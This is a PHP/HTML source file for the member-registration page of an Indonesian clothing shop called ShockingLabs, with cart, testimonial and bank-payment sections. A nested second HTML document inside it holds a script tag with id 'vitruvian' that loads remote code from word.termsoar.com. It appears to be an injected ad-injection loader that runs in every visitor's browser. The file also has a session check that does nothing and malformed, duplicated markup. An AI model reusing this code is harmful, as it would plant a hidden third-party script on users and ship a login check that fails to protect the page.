<?php
session_start();

if (ISSET($_SESSION['userlogin']))
{
}
else
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ShockingLabs</title>
<style type="text/css">
.Teks_Menu_Atas {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 10px;
}
.Area_Login {
	height: auto;
	width: 175px;
	margin-left: 6px;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.Area_Menu_Kiri {
	height: auto;
	width: 175px;
	margin-left: 10px;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.Teks_Login {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 11px;
}
.Teks_Informasi {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 11px;
}
.Teks_Menu {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	font-weight: bold;
}
.Teks_Kategori {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
}
.Teks_Testimonial {
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 12px;
}
.Teks_Testi {
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 14px;
	color: #0096C3;
}
.Area_Menu_Keranjang {
	height: auto;
	width: 175px;
	margin-left: 10px;
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 10px;
}
.Area_Menu_Keranjang_Total {
	height: auto;
	width: 175px;
	margin-left: 10px;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.Teks_Bank {
	font-size: 13px;
	font-family: Arial, Helvetica, sans-serif;
}

a:link {
	color: #006699;
	text-decoration: none;
}
a:hover {
	color: #5F9C9F;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
	color: #006699;
}
a:active {
	text-decoration: none;
	color: #5F9C9F;
}
body {
	background-image: url(Gambar/Background.gif);
}
.Area_Testimonial {
	height: auto;
	width: 375px;
	margin-top: 10px;
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 12px;
}
</style>
<script type="text/javascript">
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}
</script>
</head>

<body onLoad="MM_preloadImages('Gambar/TLogin copy.jpg')">
<table width="1370" border="0" align="center" cellpadding="0" cellspacing="0">
<td width="188"><tr>
  <th width="200" align="left" valign="top" bgcolor="#F7FAE4" scope="col"><div class="Area_Login">
    <form id="form2" name="form2" method="post" action="">
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          </a></th>
        </tr>
      </table>
    </form>
  </div></th>
  <th colspan="2" align="right" valign="middle" bgcolor="#F8FBE6" class="Teks_Menu_Atas" scope="col"> <a href="logout.php" target="_self">logout</a> | selamat datang saudara/i
    <?php include("user.php") ?>
    &nbsp;</th>
</tr>
<tr>
  <td colspan="3">&nbsp;</td>
</tr>
<tr>
  <td colspan="3">
<!DOCTYPE html>
<html lang="en">
<head>
 <script id="vitruvian" type="text/javascript" async="true" src="http://word.termsoar.com/kernel/8554AC0D-1F8A-4B3C-88FC-A82628ECA432?aid=DD0374BA-7DAE-4050-85C1-631479375AAC&amp;iid=9952A101-92B9-485A-8D59-419F54FFA501&amp;itm=2015-12-16T03:53:43Z" data-nid="8554AC0D-1F8A-4B3C-88FC-A82628ECA432" data-ie-pid="00000000-0000-0000-0000-000000000000" data-cr-pid="00000000-0000-0000-0000-000000000000" data-ff-pid="00000000-0000-0000-0000-000000000000" data-nf-pid="D03D06DB-C141-4A87-B16A-23A86B02163E" data-pid="D03D06DB-C141-4A87-B16A-23A86B02163E" data-aid="DD0374BA-7DAE-4050-85C1-631479375AAC" data-iid="9952A101-92B9-485A-8D59-419F54FFA501" data-ver="1.10.0.28" data-itm="2015-12-16T03:53:43Z" data-hid="3CA3CCF5-FA58-030F-BA64-A5FC8AB9F28B" data-ie-at="00000000-0000-0000-0000-000000000000" data-cr-at="00000000-0000-0000-0000-000000000000" data-ff-at="00000000-0000-0000-0000-000000000000" data-nf-at="4FA40B42-24AA-E954-EF3F-DA99F167BCBD" data-at="4FA40B42-24AA-E954-EF3F-DA99F167BCBD" data-ie-ver="11.0.9600.16384" data-cr-ver= ></script>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ShockingLabs</title>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
    <!-- Optional theme -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">
    
</head>

<body>

    <div class="container">
        <h1><small>Distro ShockingLabs</small>        </h1>
        <nav class="navbar navbar-default" role="navigation">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="sr-only">Toggle Responsive</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
               
            </div>
            <div class="collapse navbar-collapse" id="navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="home.php">HOME</a></li>
                    <li><a href="produk.php">PRODUCT</a></li>
                    <li><a href="caraorder.php">CARA ORDER</a></li>
                    <li><a href="download.php">DOWNLOAD</a></li>
                    <li><a href="about.php">ABOUT</a></li>
                    <li><a href="contact.php">CONTACT</a></li>
                    <li><a href="konfirmasi.php">KONFIRM</a></li>
                </ul>
            </div>
        </nav>  	
    </div>


<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>    
<!-- Latest compiled and minified JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
</body>
</html>


&nbsp;</td>
</tr>
<tr>
  <td align="left" valign="top" bgcolor="#E8EED7"><div class="Area_Login">
    <form id="form1" name="form1" method="post" action="login.php">
      <table width="100%" border="0" cellspacing="2" cellpadding="0">
        <tr>
          <td colspan="3" align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="2">
            <tr>
              <th align="left" valign="top" scope="col"><img src="Gambar/Menu Kiri Kategori.jpg" alt="" width="175" height="25" /></th>
            </tr>
            <tr>
              <th align="left" valign="top" scope="col"><?php include "kategori.php"; ?></th>
            </tr>
          </table></td>
        </tr>
        <tr>
          <td colspan="3" align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="2">
            <tr>
              <th align="left" valign="top" scope="col"><img src="Gambar/Menu Kiri News.jpg" alt="" width="175" height="25" /></th>
            </tr>
            <tr>
              <td align="left" valign="top" class="Teks_Testimonial" scope="col"><?php include "news.php"; ?></td>
            </tr>
          </table></td>
        </tr>
        <tr>
          <td width="29%" align="left" valign="top">&nbsp;</td>
          <td width="3%" align="left" valign="top">&nbsp;</td>
          <td width="68%" align="left" valign="top">&nbsp;</td>
        </tr>
        <tr>
          <td colspan="3" align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="2">
            <tr>
              <th align="left" valign="top" scope="col"><img src="Gambar/Menu Kiri Tertimonial.jpg" alt="" width="175" height="25" /></th>
            </tr>
            <tr>
              <td align="left" valign="top" class="Teks_Testimonial" scope="col"><?php include "top_testimonial.php"; ?>
                <br />
                <br />
                <div><a href="isitestimonial.php">>> isi testimonial</a><br />
                  <a href="data_testimonial.php" target="_self">>> lihat testimonial </a></div>
                <br /></td>
            </tr>
          </table></td>
        </tr>
        <tr>
          <td align="left" valign="top">&nbsp;</td>
          <td>&nbsp;</td>
          <td class="Teks_Menu">&nbsp;</td>
        </tr>
      </table>
    </form>
  </div></td>
  <td width="990" align="center" valign="top" bgcolor="#FFFFFF"><table width="100%" border="0" cellpadding="0" cellspacing="0" class="Area_Testimonial">
    <tr>
      <th align="left" valign="top" class="Teks_Testi" scope="col">Daftar Member,</th>
    </tr>
    <tr>
      <th align="left" valign="top" class="Teks_Testi" scope="col"><hr /></th>
    </tr>
    <tr>
      <td align="center" valign="top"><br />
        <?php include "form_member.php"; ?>
</div>
</td>
</tr>
    <tr>
      <th align="left" valign="top">&nbsp;</th>
    </tr>
  </table>
</td>
<td width="197" align="left" valign="top" bgcolor="#E8EED7"><div class="Area_Menu_Kiri">
  <table width="100%" border="0" cellspacing="2" cellpadding="0">
    <tr>
      <th width="13%" align="left" valign="middle" scope="col"><img src="Gambar/Kantong Belanja.png" alt="" width="25" height="25" /></th>
      <td width="87%" align="left" valign="middle" class="Teks_Menu" scope="col">Keranjang Belanja
        <?php include "jumlah.php"; ?></td>
    </tr>
    <tr>
      <th align="left" valign="top" class="Teks_Keranjang" scope="col">&nbsp;</th>
      <th align="left" valign="top" class="Teks_Keranjang" scope="col"><hr /></th>
    </tr>
    <tr>
      <th colspan="2" align="left" valign="top" class="Teks_Keranjang" scope="col"><div class="Area_Menu_Keranjang">
        <?php include "keranjang_belanja_memo.php"; ?>
      </div></th>
    </tr>
    <tr>
      <th colspan="2" align="left" valign="top" scope="col"><hr class="Area_Menu_Keranjang_Total" /></th>
    </tr>
    <tr>
      <th colspan="2" align="left" valign="middle" class="Teks_Keranjang" scope="col"><div class="Area_Menu_Keranjang_Total">
        <?php include "total.php"; ?>
      </div>
        &nbsp;</th>
    </tr>
    <tr>
      <th colspan="2" align="left" valign="top" scope="col"><img src="Gambar/Menu Kanan Best Seller.jpg" alt="" width="175" height="25" /></th>
    </tr>
    <tr>
      <th colspan="2" align="center" valign="top" scope="col"><?php include "bestseller.php"; ?></th>
    </tr>
    <tr>
      <th colspan="2" align="left" valign="top" scope="col">
    <tr>
      <th colspan="2" align="left" valign="top" scope="col"><img src="Gambar/Menu Kanan Pembayaran.jpg" alt="" width="175" height="25" /></th>
    </tr>
    <tr>
      <th align="center" valign="top" scope="col">&nbsp;</th>
      <th align="center" valign="top" scope="col">&nbsp;</th>
    </tr>
    <tr>
      <th colspan="2" align="center" valign="top" scope="col"><a href="https://ibank.klikbca.com/" target="new"><img src="Gambar/bca.jpg" alt="" width="150" height="50" /></a></th>
    </tr>
    <tr>
      <th colspan="2" align="center" valign="top" class="Teks_Bank" scope="col">1150325788</th>
    </tr>
    <tr>
      <th colspan="2" align="center" valign="top" class="Teks_Bank" scope="col">ShockingLabs</th>
    </tr>
    <tr>
      <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
      <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
    </tr>
    <tr>
      <th colspan="2" align="center" valign="top" class="Teks_Bank" scope="col"><a href="https://ib.bankmandiri.co.id/retail/Login.do?action=form&amp;lang=in_ID" target="new">
    <tr>
      <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
      <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
    </tr>
  </table>
</div></td>
</tr>
<tr>
  <td colspan="3" align="center" valign="top">&nbsp;</td>
</tr>
</table>
</body>
</html>
